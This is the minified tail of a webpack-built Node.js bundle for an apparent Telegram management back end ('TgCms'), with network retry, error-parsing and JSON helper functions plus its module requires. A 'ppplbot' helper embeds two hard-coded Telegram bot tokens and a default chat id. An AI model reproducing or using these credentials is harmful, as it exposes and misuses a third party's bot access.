n=await(0,r.default)({...t,url:e,headers:{"Content-Type":"application/json"},cancelToken:i.token,family:o});return clearTimeout(a),n}catch(t){if(clearTimeout(a),console.log(`Error at URL (IPv${o}): `,e),n(t),r.default.isCancel(t))return void console.log("Request canceled:",t.message,e);throw t}};for(let t=0;t<=o;t++)try{const t=await i(e,4);if(t)return t;const o=await i(e,6);if(o)return o}catch(i){console.log("Error at URL : ",e);const a=n(i);if(!(t<o&&"ERR_NETWORK"!==i.code&&"ECONNABORTED"!==i.code&&"ETIMEDOUT"!==i.code)||a.message.toLowerCase().includes("too many requests")||r.default.isCancel(i))return void console.log(`All ${o+1} retries failed for ${e}`);console.log(`Retrying... (${t+1}/${o})`),await new Promise((e=>setTimeout(e,2e3)))}},t.toBoolean=function(e){return"string"==typeof e?"true"===e.toLowerCase():"number"==typeof e?1===e:e},t.fetchNumbersFromString=function(e){const t=e.match(/\d+/g);return t?t.join(""):""},t.parseError=n,t.ppplbot=function(e,t){let o=t;return o||(o=a%2==1?"bot6624618034:AAHoM3GYaw3_uRadOWYzT7c2OEp6a7A61mY":"bot6607225097:AAG6DJg9Ll5XVxy24Nr449LTZgRb5bgshUA",a++),`https://api.telegram.org/${o}/sendMessage?chat_id=${e||"-1001801844217"}`},t.areJsonsNotSame=function(e,t){const o=["id","_id"];return!function e(t,i){if(t===i)return!0;if("object"!=typeof t||"object"!=typeof i||null===t||null===i)return!1;const r=Object.keys(t).filter((e=>!o.includes(e))).sort(),n=Object.keys(i).filter((e=>!o.includes(e))).sort();return r.length===n.length&&r.every((o=>e(t[o],i[o])))}(e,t)},t.mapToJson=function(e){const t={};for(const[o,i]of e.entries())t[String(o)]=i;return t};const r=i(o(8938));function n(e,t="TgCms"){let o="UNKNOWN",i="An unknown error occurred",r="UnknownError";const n=e=>{if(Array.isArray(e))return e.map((e=>n(e))).filter((e=>void 0!==e)).join(", ");if("string"==typeof e)return e;if("object"==typeof e&&null!==e){let t="";for(const o in e){const i=e[o];if(Array.isArray(e[o])&&e[o].every((e=>"string"==typeof e)))t+=e[o].join(", ");else{const e=n(i);e&&(t+=e)}}return t}return JSON.stringify(e)};if(e.response){const t=e.response;o=t.data?.status||t.status||e.status||"UNKNOWN",i=t.data?.message||t.data?.errors||t.errorMessage||t.message||t.statusText||t.data||e.message||"An error occurred",r=t.data?.error||t.error||e.name||e.code||"Error"}else e.request?(o=e.status||"NO_RESPONSE",i=e.data?.message||e.data?.errors||e.message||e.statusText||e.data||e.message||"The request was triggered but no response was received",r=e.name||e.code||"NoResponseError"):e.message?(o=e.status||"UNKNOWN",i=e.message,r=e.name||e.code||"Error"):e.errorMessage&&(o=e.status||"UNKNOWN",i=e.errorMessage,r=e.name||e.code||"Error");const a=`${t?`${t} ::`:""} ${n(i)} `,s={status:o,message:e.errorMessage||a,error:r};return console.log("RPCError"==s.error?s.message:s),s}let a=0;t.defaultReactions=["","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","","",""],t.defaultMessages=["1","2","3","4","5","6","7","8","9","10","11","12","13","14","15","16","17","18","19","20","21"]},3563:e=>{e.exports=require("@nestjs/common")},3428:e=>{e.exports=require("@nestjs/config")},8781:e=>{e.exports=require("@nestjs/core")},8073:e=>{e.exports=require("@nestjs/mapped-types")},5839:e=>{e.exports=require("@nestjs/mongoose")},9556:e=>{e.exports=require("@nestjs/platform-express")},9742:e=>{e.exports=require("@nestjs/swagger")},4650:e=>{e.exports=require("adm-zip")},8938:e=>{e.exports=require("axios")},2041:e=>{e.exports=require("big-integer")},4922:e=>{e.exports=require("class-transformer")},7403:e=>{e.exports=require("class-validator")},1416:e=>{e.exports=require("cloudinary")},2559:e=>{e.exports=require("imap")},6037:e=>{e.exports=require("mongoose")},8461:e=>{e.exports=require("multer")},3047:e=>{e.exports=require("telegram")},7385:e=>{e.exports=require("telegram/Helpers")},9425:e=>{e.exports=require("telegram/Password")},8178:e=>{e.exports=require("telegram/client/uploads")},6969:e=>{e.exports=require("telegram/events")},5651:e=>{e.exports=require("telegram/extensions/Logger")},689:e=>{e.exports=require("telegram/sessions")},3820:e=>{e.exports=require("telegram/tl")},9896:e=>{e.exports=require("fs")},6928:e=>{e.exports=require("path")}},t={},o=function o(i){var r=t[i];if(void 0!==r)return r.exports;var n=t[i]={exports:{}};return e[i].call(n.exports,n,n.exports,o),n.exports}(7927),i=exports;for(var r in o)i[r]=o[r];o.__esModule&&Object.defineProperty(i,"__esModule",{value:!0})})();
//# sourceMappingURL=index.js.map